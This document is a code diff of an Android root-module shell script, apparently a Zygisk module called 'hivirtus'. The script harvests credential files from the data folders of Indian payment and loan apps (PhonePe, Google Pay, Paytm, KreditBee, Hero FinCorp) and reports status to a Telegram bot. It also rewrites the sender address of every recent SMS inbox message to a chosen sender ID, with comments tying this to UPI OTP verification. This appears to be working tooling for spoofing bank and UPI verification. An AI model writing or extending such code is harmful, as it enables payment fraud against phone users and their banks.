@@ -104,13 +104,11 @@ hivirtus_harvest_saves() {
       echo "$NOW" > /data/local/tmp/hivirtus_harvest_log.ts
     fi
   fi
-  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android; do
+  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android com.herofincorp.diyjourneys; do
     for f in \
       "/data/data/$pkg/files/hivirtus_telegram_credentials.json" \
       "/data/user/0/$pkg/files/hivirtus_telegram_credentials.json" \
-      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_telegram_credentials.json" \
-      "/data/data/$pkg/files/hivirtus_tg_test.request" \
-      "/data/user/0/$pkg/files/hivirtus_tg_test.request"
+      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_telegram_credentials.json"
     do
       [ -f "$f" ] && [ -s "$f" ] || continue
       bn=$(basename "$f")
@@ -118,14 +116,23 @@ hivirtus_harvest_saves() {
       chmod 666 "/data/local/tmp/$bn" 2>/dev/null
     done
   done
+  # NEVER harvest hivirtus_tg_test.request — that caused infinite TG test spam
   for f in /sdcard/Documents/hivirtus_telegram_credentials.json \
-           /sdcard/Download/hivirtus_telegram_credentials.json \
-           /sdcard/Documents/hivirtus_tg_test.request \
-           /sdcard/Download/hivirtus_tg_test.request; do
+           /sdcard/Download/hivirtus_telegram_credentials.json; do
     [ -f "$f" ] && [ -s "$f" ] || continue
     bn=$(basename "$f")
     cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
     chmod 666 "/data/local/tmp/$bn" 2>/dev/null
+  done
+  # Purge stale test request copies that older builds left in app/sdcard
+  rm -f /sdcard/Documents/hivirtus_tg_test.request \
+        /sdcard/Download/hivirtus_tg_test.request 2>/dev/null
+  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
+             com.yespay.next com.kreditbee.android com.herofincorp.diyjourneys; do
+    rm -f "/data/data/$pkg/files/hivirtus_tg_test.request" \
+          "/data/user/0/$pkg/files/hivirtus_tg_test.request" \
+          "/data/data/$pkg/cache/hivirtus_tg_test.request" \
+          "/data/user/0/$pkg/cache/hivirtus_tg_test.request" 2>/dev/null
   done
 }
 
@@ -182,23 +189,24 @@ sync_config() {
     TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
       OLD_HASH=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null)
+      SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
       NEW_HASH="${TG_T}|${TG_C}"
       printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
         > /data/local/tmp/hivirtus_telegram_credentials.json
       chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
-      # Test ONLY when token/chat hash changes (Save with new/same re-type) — mtime spam band
-      if [ "$NEW_HASH" != "$OLD_HASH" ]; then
+      # Test ONLY when token/chat actually changes — never on every Save / save_ok flag
+      if [ "$NEW_HASH" != "$OLD_HASH" ] && [ "$NEW_HASH" != "$SENT_HASH" ]; then
         echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
         echo 1 > /data/local/tmp/hivirtus_tg_test.request
-        rm -f /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null
+        rm -f /data/local/tmp/hivirtus_tg_test_fails /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
         chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
         echo "tg_test_queued $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      elif [ -f /data/local/tmp/hivirtus_save_ok.flag ]; then
-        # Explicit Save from UI (flag) — one test then clear flag
+      else
+        # Same creds — clear Save ping, do NOT re-queue test
         rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
-        echo 1 > /data/local/tmp/hivirtus_tg_test.request
-        chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
-        echo "tg_test_queued_save $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+        if [ "$NEW_HASH" = "$SENT_HASH" ] || [ "$NEW_HASH" = "$OLD_HASH" ]; then
+          echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
+        fi
       fi
     fi
   fi
@@ -260,16 +268,21 @@ sync_config
 (
   hivirtus_seed_app_writable_files
   hivirtus_seed_app_code_cache
-  # Boot test: pehle se token ho to 🚀 test bhejo — SIRF EK BAAR per boot
+  # Boot test: pehle se token ho to 🚀 test — SIRF agar is hash pe pehle nahi gaya
   if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
      [ ! -f /data/local/tmp/hivirtus_tg_boot_sent.flag ]; then
     TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-    if [ -n "$TG_T" ] && [ -n "$TG_C" ] && [ "$TG_T" != "{" ] && [ ${#TG_T} -gt 10 ]; then
+    BOOT_HASH="${TG_T}|${TG_C}"
+    SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
+    if [ -n "$TG_T" ] && [ -n "$TG_C" ] && [ "$TG_T" != "{" ] && [ ${#TG_T} -gt 10 ] && \
+       [ "$BOOT_HASH" != "$SENT_HASH" ]; then
       echo 1 > /data/local/tmp/hivirtus_tg_test.request
       chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
       echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
       echo "tg_boot_test_queued $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    else
+      echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
     fi
   fi
 ) &
@@ -511,7 +524,7 @@ tg_http_post() {
   return 1
 }
 
-# Save pe Telegram test — exact format user ne diya
+# Save pe Telegram test — exact format user ne diya (MAX 1 per token|chat)
 send_tg_test_if_requested() {
   [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
   read_tg_creds
@@ -519,6 +532,21 @@ send_tg_test_if_requested() {
     rm -f /data/local/tmp/hivirtus_tg_test.request
     return 0
   fi
+  CUR_HASH="${TG_TOKEN}|${TG_CHAT}"
+  SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
+  # Already sent for these creds — drop request (stops Save/harvest spam)
+  if [ -n "$SENT_HASH" ] && [ "$CUR_HASH" = "$SENT_HASH" ]; then
+    rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
+    return 0
+  fi
+  # Rate limit: at most 1 attempt per 60s even if request keeps reappearing
+  NOW=$(date +%s)
+  LAST_TRY=$(cat /data/local/tmp/hivirtus_tg_test_last_try.ts 2>/dev/null || echo 0)
+  if [ $((NOW - LAST_TRY)) -lt 60 ] && [ -f /data/local/tmp/hivirtus_tg_test_fails ]; then
+    return 0
+  fi
+  echo "$NOW" > /data/local/tmp/hivirtus_tg_test_last_try.ts
+
   DEV=$(device_name)
   if module_is_active; then
     STATUS="Successful Active!"
@@ -536,47 +564,46 @@ Device: ${DEV}"
   SENT=0
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
   if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
-    rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD"
+    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
+    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
+    rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD" /data/local/tmp/hivirtus_tg_test_fails
     echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   else
     FAILS=$(cat /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null || echo 0)
     FAILS=$((FAILS + 1))
     echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
-    if [ "$FAILS" -ge 3 ]; then
-      TEXT2="🚀 @hivirtus Zygisk Mode Test
-not active
-
-Device: ${DEV}"
-      ESC2=$(tg_json_escape "$TEXT2")
-      printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC2}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
-      tg_http_post "$PAYLOAD" "$RESP" || true
+    if [ "$FAILS" -ge 2 ]; then
+      # Give up — mark as sent-attempted so we don't spam forever
+      echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
       rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails "$PAYLOAD"
     fi
     echo "tg_test_fail $(date +%s) resp=$(head -c 120 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   fi
 }
 
-# SMSTweaks-style inbox rewrite — saved sender ID pe address update (root content, no Zygisk phone inject)
+# SMSTweaks-style inbox rewrite — ANY recent inbox address → saved Sender ID
+# (JNI SmsMessage hooks + root content update — Messages/UPI OTP auto-read)
 rewrite_inbox_sender_id() {
   local sid=""
   if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
     sid=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
+  fi
+  if [ -z "$sid" ] && [ -f "$MODDIR/sender_id.txt" ]; then
+    sid=$(head -n1 "$MODDIR/sender_id.txt" 2>/dev/null | tr -d '\r\n')
   fi
   if [ -z "$sid" ]; then
     sid=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
   fi
   [ -z "$sid" ] || [ "$sid" = "AD-TEST-S" ] && return 0
 
-  local override=1
-  if [ -f "$RUNTIME" ]; then
-    grep -q '"override_incoming_sender"[[:space:]]*:[[:space:]]*false' "$RUNTIME" 2>/dev/null && override=0
-  fi
-  [ "$override" = "0" ] && return 0
+  # Persist for Zygisk hooks
+  echo "$sid" > /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
+  echo "$sid" > "$MODDIR/sender_id.txt" 2>/dev/null
+  chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
 
-  # Recent inbox rows — numeric / +91 address → saved sender ID
   local out="/data/local/tmp/hivirtus_inbox_query.txt"
-  content query --uri content://sms/inbox --projection _id:address:date \
-    --sort "date DESC" 2>/dev/null | head -n 40 > "$out" || return 0
+  content query --uri content://sms/inbox --projection _id:address:date:body \
+    --sort "date DESC" 2>/dev/null | head -n 60 > "$out" || return 0
 
   local now_ms id addr date digits
   now_ms=$(date +%s)000
@@ -586,17 +613,14 @@ rewrite_inbox_sender_id() {
     date=$(echo "$line" | sed -n 's/.*date=\([0-9]*\).*/\1/p')
     [ -z "$id" ] || [ -z "$addr" ] && continue
     [ "$addr" = "$sid" ] && continue
-    # Only rewrite recent (~10 min) messages
-    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 600000)) ] 2>/dev/null; then
+    # Recent ~30 min (SMSTweaks window for OTP verify)
+    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 1800000)) ] 2>/dev/null; then
       continue
     fi
-    digits=$(echo "$addr" | tr -cd '0-9')
-    # Phone-like or short code / alphanumeric bank headers — rewrite all non-matching
-    if [ ${#digits} -ge 8 ] || echo "$addr" | grep -qE '^[A-Za-z0-9-]{3,}$'; then
-      content update --uri content://sms/inbox \
-        --bind address:s:"$sid" \
-        --where "_id=$id" >/dev/null 2>&1 || true
-    fi
+    # SMSTweaks: koi bhi incoming (+91 / bank header / shortcode) → saved Sender ID
+    content update --uri content://sms/inbox \
+      --bind address:s:"$sid" \
+      --where "_id=$id" >/dev/null 2>&1 || true
   done < "$out"
 }
 
